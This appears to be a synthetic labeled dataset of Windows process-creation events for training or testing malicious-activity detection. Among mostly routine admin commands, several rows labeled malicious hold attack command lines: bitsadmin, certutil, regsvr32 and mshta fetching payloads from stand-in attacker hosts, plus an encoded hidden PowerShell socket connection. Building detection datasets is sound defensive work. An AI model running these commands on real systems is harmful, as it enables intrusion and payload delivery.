UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label
2024-07-04T19:32:14.417Z,{FA6F86AF-248C-471F-ADEE-25FABEE3DACC},8395,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job3133 /download /priority high http://dropper-srv7787.cc/sys604.exe C:\Users\Public\loader690.exe,C:\Windows\System32\cmd.exe,cmd.exe,50899,CORP\mjones,Medium,1,T1197,BITSAdmin Download,malicious
2024-07-01T16:29:00.377Z,{56A14BA1-F580-4A7A-A694-997B90F1D729},14151,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Restart-Service -Name Spooler -Force""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,20109,CORP\itops,High,0,,,benign
2024-07-03T03:43:23.557Z,{A8E49BCB-FC1B-4401-9317-365C02BE40AF},60093,C:\Program Files\Microsoft VS Code\Code.exe,Code.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",65083,CORP\helpdesk,Medium,0,,,benign
2024-07-04T07:55:57.163Z,{4B01FC93-D135-4EB8-AEF5-429AD9F5100E},54312,C:\Windows\System32\SearchIndexer.exe,C:\Windows\System32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,22458,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-05T15:48:25.551Z,{6BE77A2B-FCD9-4F9C-B0BF-66A65D9DAA55},6318,C:\Windows\System32\wbem\WMIC.exe,"wmic.exe os get caption,version,buildnumber",C:\Windows\System32\cmd.exe,cmd.exe,52596,CORP\sysadmin,High,0,,,gray_area
2024-07-02T08:44:48.316Z,{E9AFAE69-C1F4-4619-A561-AA0DB8735C05},61393,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,23270,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-05T03:09:06.168Z,{FCF0B48F-3FDE-4782-A22D-A563DC456174},30462,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,31543,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-05T16:47:56.139Z,{7085CBF1-180D-4B56-8063-C44E10BDFDFE},57624,C:\Program Files\Slack\Slack.exe,Slack.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",5575,CORP\mjones,Medium,0,,,benign
2024-07-01T10:23:44.144Z,{FE327C74-7540-456E-B397-BE5B7CE21940},34477,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'}""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,26458,CORP\sysadmin,High,0,,,benign
2024-07-03T10:53:03.707Z,{86515B9E-DB22-4760-822B-E0DF114D97CE},52403,C:\Windows\System32\mmc.exe,mmc.exe devmgmt.msc,C:\Windows\explorer.exe,C:\Windows\explorer.exe,20342,CORP\sysadmin,High,0,,,benign
2024-07-02T19:51:44.530Z,{F7F85B02-3A5D-4F0F-9788-9336B18482B5},31444,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",4291,CORP\agarwal,Medium,0,,,benign
2024-07-01T11:50:04.353Z,{024F43B2-56EC-4D22-AF8E-9F4960733C2C},16802,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,49034,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-01T22:07:54.670Z,{50B2D75C-C38B-4306-AC48-C37DFFD6301A},43658,C:\Program Files\Windows Defender\MsMpEng.exe,"""C:\Program Files\Windows Defender\MsMpEng.exe""",C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,58521,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-05T12:56:54.432Z,{B6416733-660C-41C7-83AF-5050690B764F},53973,C:\Windows\System32\eventvwr.exe,eventvwr.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,1836,CORP\itops,High,0,,,benign
2024-07-01T08:44:21.836Z,{7B42B107-1879-4F63-A93A-E070EA509253},8903,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-WmiObject Win32_OperatingSystem | Select Caption, Version""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,57383,CORP\agarwal,Medium,0,,,benign
2024-07-04T14:28:04.648Z,{DE4C6845-3BD0-47BB-AAA7-6FE7993D73BC},53074,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-EventLog -LogName System -Newest 50""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,58679,CORP\agarwal,Medium,0,,,benign
2024-07-05T11:45:10.318Z,{DA228046-6CA1-42B1-988D-9AE6846AFA59},37099,C:\Program Files\Microsoft VS Code\Code.exe,Code.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",1896,CORP\agarwal,Medium,0,,,benign
2024-07-04T20:48:53.431Z,{F2318017-43E5-4203-ADBC-C99908F66AD2},17532,C:\Windows\System32\notepad.exe,notepad.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",55716,CORP\analyst01,Medium,0,,,benign
2024-07-02T15:44:31.376Z,{4B362883-246E-4D18-9883-9DA16ED687A3},61575,C:\Windows\System32\SearchIndexer.exe,C:\Windows\System32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,53251,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-01T08:28:17.214Z,{BC4FFCBB-1021-4780-A5A9-2698CF2739D7},50885,C:\Windows\System32\msiexec.exe,msiexec.exe /i C:\Installers\app_setup_6.2.40.msi /quiet,C:\Windows\explorer.exe,C:\Windows\explorer.exe,51694,CORP\sysadmin,High,0,,,benign
2024-07-02T11:43:36.451Z,{48F7E680-AA93-4256-A7EB-FF647F798C91},31256,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,51425,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-04T16:41:22.315Z,{84ABD460-D447-4DE3-8CF9-DB2D4DF87F31},18141,C:\Windows\System32\cmd.exe,cmd.exe /c tasklist,C:\Windows\explorer.exe,C:\Windows\explorer.exe,24569,CORP\analyst02,Medium,0,,,benign
2024-07-05T12:38:34.172Z,{16AC70E8-68A1-40E1-898F-689FF15503DF},22210,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Process | Sort-Object CPU -Descending | Select -First 10""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,65159,CORP\agarwal,Medium,0,,,benign
2024-07-02T11:49:05.254Z,{BB3A8415-860F-4DEA-86B2-9E29263174D8},11334,C:\Windows\System32\conhost.exe,conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,33762,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-02T12:49:18.721Z,{123F862C-A388-400F-AABA-7D711270F1B7},14584,C:\Windows\System32\cmd.exe,cmd.exe /c net use Z: \\fileserver\share,C:\Windows\explorer.exe,C:\Windows\explorer.exe,46235,CORP\pchen,Medium,0,,,benign
2024-07-01T09:43:43.607Z,{51F9D505-D3AC-44CB-BBB8-2DA52AC468DF},32891,C:\Windows\System32\lsass.exe,C:\Windows\System32\lsass.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,35533,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-04T15:36:15.713Z,{A450D23A-1455-4FA3-8279-BB884B773752},15801,C:\Windows\System32\cmd.exe,cmd.exe /c ping google.com,C:\Windows\explorer.exe,C:\Windows\explorer.exe,20659,CORP\analyst01,Medium,0,,,benign
2024-07-04T20:19:44.371Z,{8D03A306-606A-44BC-8865-383BEB5F5E04},10110,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAwAC4AMAAuADEAJwAsADQANAA0ADQAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"" /n document15.docm",54545,CORP\agarwal,Medium,1,T1204.002,Office Macro Execution,malicious
2024-07-03T17:46:36.011Z,{632DD9BD-98A6-4489-8FA0-F71EF70BEBA2},18141,C:\Windows\System32\cmd.exe,cmd.exe /c dir C:\Users,C:\Windows\explorer.exe,C:\Windows\explorer.exe,43839,CORP\analyst01,Medium,0,,,benign
2024-07-02T13:08:47.799Z,{E50B5924-8BC8-4244-BC2B-6E88CB595224},58243,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ChildItem -Path C:\Logs -Recurse -Filter *.log""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,18613,CORP\itops,High,0,,,benign
2024-07-01T10:05:31.865Z,{6FAA35B7-9F3C-4E20-A3B1-FD517F0B3368},29436,C:\Windows\System32\cmd.exe,cmd.exe /c ping 8.8.8.8,C:\Windows\explorer.exe,C:\Windows\explorer.exe,43264,CORP\admin,High,0,,,benign
2024-07-05T00:45:44.360Z,{C6A5CD71-62DD-4736-AD74-2AA3D79AABFC},63099,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s wuauserv,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,38201,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-02T14:42:24.693Z,{FCCB86AC-2447-4CEE-ABFA-DE1C84EDE083},50029,C:\Windows\System32\calc.exe,calc.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",60166,CORP\pchen,Medium,0,,,benign
2024-07-03T11:20:20.668Z,{3F8FCE42-CF64-4D6C-B11D-49EDC9B275CA},20094,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --type=renderer --field-trial-handle=12345,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",47558,CORP\mjones,Low,0,,,benign
2024-07-01T15:20:26.155Z,{23F04F59-0C09-4DD4-81E9-CED57444EC51},28063,C:\Windows\System32\cmd.exe,cmd.exe /c nslookup corp.local,C:\Windows\explorer.exe,C:\Windows\explorer.exe,46252,CORP\klee,Medium,0,,,benign
2024-07-05T15:37:36.965Z,{3A8F43AA-5BF1-4426-BB22-AEE80BE253CF},44722,C:\Windows\regedit.exe,regedit.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,47538,CORP\sysadmin,High,0,,,benign
2024-07-03T14:56:43.137Z,{6299306F-67CF-433E-8118-E406EBDD5BB2},23461,C:\Windows\System32\msiexec.exe,msiexec.exe /i C:\Temp\update_9.9.67.msi /passive /norestart,C:\Windows\explorer.exe,C:\Windows\explorer.exe,60073,CORP\sysadmin,High,0,,,benign
2024-07-03T12:13:42.733Z,{EE00218B-78B7-4D33-BDF4-EF1EE79846FF},21590,C:\Windows\System32\calc.exe,calc.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",16642,CORP\netadmin,Medium,0,,,benign
2024-07-01T11:14:46.134Z,{C37874EA-C3D7-4594-8735-D16906523C9D},14840,C:\Users\sysadmin\Downloads\installer.exe,installer.exe --silent --accept-license,C:\Windows\explorer.exe,C:\Windows\explorer.exe,49108,CORP\sysadmin,High,0,,,benign
2024-07-03T16:48:11.519Z,{FC01D87F-9342-4A51-ACCB-825422D043BA},60809,C:\Windows\System32\calc.exe,calc.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",7973,CORP\mjones,Medium,0,,,benign
2024-07-04T09:50:51.510Z,{98A5BC1A-8543-492A-A5C1-BC953562A774},25339,C:\Windows\System32\taskeng.exe,taskeng.exe {GUID} S,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,31388,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-05T04:25:42.379Z,{E4723FA0-070E-46A1-87C3-AE81CB040527},9666,C:\Windows\System32\certutil.exe,certutil -decode C:\Users\Public\encoded5553.txt C:\Users\Public\decoded3947.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,64442,CORP\jsmith,Medium,1,T1140,Certutil Base64 Decode,malicious
2024-07-03T08:45:55.694Z,{3C0ED220-60FC-4723-9390-A9415FCAE3D4},35394,C:\Users\sysadmin\Downloads\installer.exe,installer.exe --silent --accept-license,C:\Windows\explorer.exe,C:\Windows\explorer.exe,51300,CORP\sysadmin,High,0,,,benign
2024-07-01T21:37:31.055Z,{00E1CE58-6B44-49A9-9A28-F2DCEDFCD2C4},59359,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s /n /u /i:http://malware-cdn3894.io/file891.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,29564,CORP\klee,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious
2024-07-04T10:28:34.495Z,{E40B84A9-63D1-4AB9-B732-81D79EB9C846},23618,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",22786,CORP\netadmin,Medium,0,,,benign
2024-07-04T13:51:35.628Z,{2D1604B2-FDF1-4A47-BA65-6A4C65D554C5},46682,C:\Windows\System32\odbcad32.exe,odbcad32.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",45863,CORP\dbadmin,Medium,0,,,benign
2024-07-03T19:38:54.413Z,{4DEE51B0-6B0D-4376-B339-815414042F8E},9045,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job1766 /download /priority high http://c2-server6478.io/sys605.exe C:\Users\Public\sys948.exe,C:\Windows\System32\cmd.exe,cmd.exe,16261,CORP\mjones,Medium,1,T1197,BITSAdmin Download,malicious
2024-07-02T12:05:41.369Z,{95EAC93A-29BD-477E-BCF4-040DAAB666A9},17409,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Disk | Get-Partition | Get-Volume""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,6401,CORP\mjones,Medium,0,,,benign
2024-07-04T13:37:31.791Z,{F4DBEA1F-D56D-40A3-9608-5B863AC88445},51848,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Set-ExecutionPolicy RemoteSigned -Scope CurrentUser""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,13807,CORP\itops,High,0,,,benign
2024-07-03T15:51:54.165Z,{F3C087EE-856B-4437-98DD-5AD27CDA9034},41753,C:\Windows\System32\msiexec.exe,msiexec.exe /i http://deploy.corp.local/package44.msi /quiet /norestart,C:\Windows\System32\cmd.exe,cmd.exe,14579,CORP\itops,High,0,,,gray_area
2024-07-04T04:38:57.527Z,{7739C383-CCA8-47F1-93D1-75F6265D1A6D},10160,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,22493,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-05T11:16:02.725Z,{5897CB37-6D5C-458E-977C-3D1B71561E8A},29577,C:\Program Files\Slack\Slack.exe,Slack.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",1110,CORP\agarwal,Medium,0,,,benign
2024-07-02T09:58:06.536Z,{97905ED6-14C8-4B07-9D4A-6D6104B370A1},10758,C:\Windows\System32\cmd.exe,cmd.exe /c arp -a,C:\Windows\explorer.exe,C:\Windows\explorer.exe,16792,CORP\itops,High,0,,,benign
2024-07-03T14:52:57.123Z,{E7277370-98BE-45D6-BA64-A45EB2412E01},4399,C:\Windows\System32\schtasks.exe,"schtasks.exe /run /tn ""\Microsoft\Windows\Defrag\ScheduledDefrag""",C:\Windows\System32\cmd.exe,cmd.exe,14274,CORP\sysadmin,High,0,,,gray_area
2024-07-01T16:35:19.533Z,{A91672AC-38EC-4B3C-9D7E-CD0774A022F0},23328,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer wsus_update /download /priority normal http://sccm01.corp.local/update_kb4585870.cab C:\Windows\SoftwareDistribution\Download\update_kb4585870.cab,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s BITS,50613,NT AUTHORITY\SYSTEM,System,0,,,gray_area
2024-07-03T13:13:29.982Z,{A23A8838-8071-4693-B068-F354B83D7F25},40289,C:\Windows\System32\wbem\WMIC.exe,"wmic.exe computersystem get model,manufacturer,totalphysicalmemory",C:\Windows\System32\cmd.exe,cmd.exe,22525,CORP\admin,High,0,,,gray_area
2024-07-04T15:11:10.686Z,{CEFF57A5-E2F0-4E55-B719-8EE4AF5CA26D},61468,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s /n /u /i:http://stager3419.top/file55.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,3825,CORP\jsmith,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious
2024-07-05T13:25:55.702Z,{2569E635-4EB4-4932-AC93-224629DD51D2},51849,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,msedge.exe --type=gpu-process,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""",12455,CORP\jsmith,Low,0,,,benign
2024-07-05T10:28:02.946Z,{198E083B-5DDC-40D4-A2B2-F09859EF355B},54619,C:\Program Files\nodejs\node.exe,node.exe server.js,C:\Windows\System32\cmd.exe,cmd.exe,16301,CORP\klee,Medium,0,,,benign
2024-07-01T16:06:10.645Z,{34C87C40-273D-435E-B404-53844C35FD72},8737,C:\Windows\System32\rundll32.exe,"rundll32.exe shell32.dll,Control_RunDLL intl.cpl,,0",C:\Windows\explorer.exe,C:\Windows\explorer.exe,58073,CORP\dbadmin,Medium,0,,,gray_area
2024-07-07T03:00:07.560Z,{390FFEF3-A70C-4F70-B0B7-5B2DE0492DD0},23849,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -Command ""Invoke-GPUpdate -Computer DC01 -Force""",C:\Windows\System32\cmd.exe,cmd.exe,5427,CORP\admin,High,0,,,gray_area
2024-07-02T16:02:24.676Z,{AB465630-F8CE-4666-820F-96C5AF0260D8},13517,C:\Windows\System32\mshta.exe,mshta.exe http://apt-infra1495.cc/payloads/script548.hta,C:\Windows\explorer.exe,explorer.exe,20586,CORP\mjones,Medium,1,T1218.005,Mshta Remote HTA,malicious
2024-07-04T12:59:40.545Z,{8B8360AD-EC29-4A6E-BE62-33571E124121},54014,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Users\Public\core721.csproj,C:\Windows\System32\cmd.exe,cmd.exe,41266,CORP\agarwal,Medium,1,T1127.001,MSBuild Inline Task,malicious
2024-07-04T15:44:25.889Z,{82737D26-B794-45B1-838A-4C58FD903FAC},44104,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ADUser -Filter * -Properties LastLogonDate, Department, Title | Where-Object {$_.LastLogonDate -lt (Get-Date).AddDays(-90)} | Select Name, SamAccountName, LastLogonDate, Department | Export-Csv C:\Reports\stale_accounts.csv -NoTypeInformation""",C:\Windows\System32\cmd.exe,cmd.exe,64294,CORP\admin,High,0,,,gray_area
2024-07-05T06:24:26.464Z,{4B85BF98-FC71-4D21-BAA7-DEDEF88AEEF9},23340,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,11315,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T04:00:55.642Z,{7F3CEA07-D7F3-497E-AEB5-FA193C7956E6},5633,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c update466.exe"")",C:\Windows\explorer.exe,cmd.exe,26223,CORP\klee,Medium,1,T1218.011,Rundll32 JavaScript,malicious
2024-07-01T15:45:28.572Z,{94ECA7DB-CAD9-4817-99BF-CDF0058CD368},20314,C:\Windows\System32\taskeng.exe,taskeng.exe {GUID} S,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,36568,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-04T16:59:17.561Z,{B143EDAD-9643-4AF6-A938-9006A52610ED},30153,C:\Program Files\Mozilla Firefox\firefox.exe,firefox.exe -contentproc -childID 7,C:\Program Files\Mozilla Firefox\firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe""",9854,CORP\helpdesk,Low,0,,,benign
2024-07-04T08:27:12.705Z,{9CB35F44-1594-4496-84EC-B73DCDD3B343},60598,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'}""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,9645,CORP\sysadmin,High,0,,,benign
2024-07-01T14:40:19.743Z,{6D57C823-1180-42B2-8F0D-91665CE42ECE},46838,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ADUser -Filter * -Properties LastLogonDate | Select Name, LastLogonDate""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,50494,CORP\mjones,Medium,0,,,benign
2024-07-01T21:22:51.554Z,{A0323B26-9D68-46C7-997E-6539F82E2A64},28131,C:\Windows\System32\wuauclt.exe,wuauclt.exe /detectnow /updatenow,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,64616,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-02T13:28:56.233Z,{C33F2DCE-17E2-4A1A-A535-540F36C5BB12},28119,C:\Windows\System32\taskhostw.exe,taskhostw.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,23212,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-04T20:36:39.061Z,{48BFE1C5-B236-48B9-83AF-6CAF0534CB21},40952,C:\Program Files\Microsoft VS Code\Code.exe,Code.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",63921,CORP\pchen,Medium,0,,,benign
2024-07-01T16:46:53.195Z,{B84E5E4C-FED7-44D3-A01A-70E9549EB978},4377,C:\Windows\System32\cmd.exe,cmd.exe /c tracert 8.8.8.8,C:\Windows\explorer.exe,C:\Windows\explorer.exe,18593,CORP\analyst01,Medium,0,,,benign
2024-07-03T17:50:41.774Z,{7BF38384-DAD6-4F03-94F9-A0B3DD687170},23761,C:\Windows\System32\schtasks.exe,"schtasks.exe /run /tn ""\Microsoft\Windows\WindowsUpdate\Automatic App Update""",C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,53790,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-04T13:27:26.478Z,{F6CE2608-EBE7-40E0-B4E6-32E9F2BD1BBB},57612,C:\Windows\System32\calc.exe,calc.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",48780,CORP\klee,Medium,0,,,benign
2024-07-03T11:40:12.635Z,{D0CCCC5A-2484-4AB8-9979-4EBE697B5577},17425,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",45417,CORP\klee,Medium,0,,,benign
2024-07-04T10:26:01.880Z,{28C93005-3645-4C4F-916D-6C191DC9AFB0},35596,C:\Windows\System32\schtasks.exe,"schtasks.exe /create /tn ""NightlyBackup"" /tr ""C:\Scripts\backup.bat"" /sc daily /st 02:00",C:\Windows\System32\cmd.exe,cmd.exe,21799,CORP\sysadmin,High,0,,,gray_area
2024-07-01T12:48:59.448Z,{6AF6E817-163E-4528-A6AA-50056443C9B3},25996,C:\Windows\System32\mmc.exe,mmc.exe diskmgmt.msc,C:\Windows\explorer.exe,C:\Windows\explorer.exe,26894,CORP\itops,High,0,,,benign
2024-07-05T17:35:21.686Z,{F04258AE-F51E-4C49-A955-9FE9BCCAB2A2},9010,C:\Windows\System32\taskhostw.exe,taskhostw.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,27922,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T12:38:33.301Z,{9286A1E6-90BB-45E5-B4DB-A3182D42D79E},30734,C:\Program Files\Windows Defender\MsMpEng.exe,"""C:\Program Files\Windows Defender\MsMpEng.exe""",C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,34131,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-05T09:33:16.385Z,{AD150113-7B85-4801-9966-9F0377ED6C7E},64745,C:\Windows\System32\eventvwr.exe,eventvwr.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,60457,CORP\sysadmin,High,0,,,benign
2024-07-05T09:57:20.496Z,{AA31F8C5-4AE5-468D-B2D8-01842C9A029F},57804,C:\Program Files\Git\bin\git.exe,git.exe pull origin main,C:\Windows\System32\cmd.exe,cmd.exe,40131,CORP\klee,Medium,0,,,benign
2024-07-04T10:03:42.057Z,{4FC38F6F-B47D-493C-B2FB-40D1B90DF558},14100,C:\Windows\regedit.exe,regedit.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,18496,CORP\admin,High,0,,,benign
2024-07-03T19:28:04.503Z,{19650D4D-93EF-4743-9502-0F1DE40F4582},65187,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -f http://exploit-kit4226.org/svc284.exe C:\Users\Public\update392.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,61855,CORP\mjones,Medium,1,T1105,Certutil Download,malicious
2024-07-01T17:32:33.715Z,{D1FBEF64-2026-4CAC-8E16-D11D8473215C},16182,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe https://sharepoint.corp.local/sites/team,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",41317,CORP\klee,Medium,0,,,benign
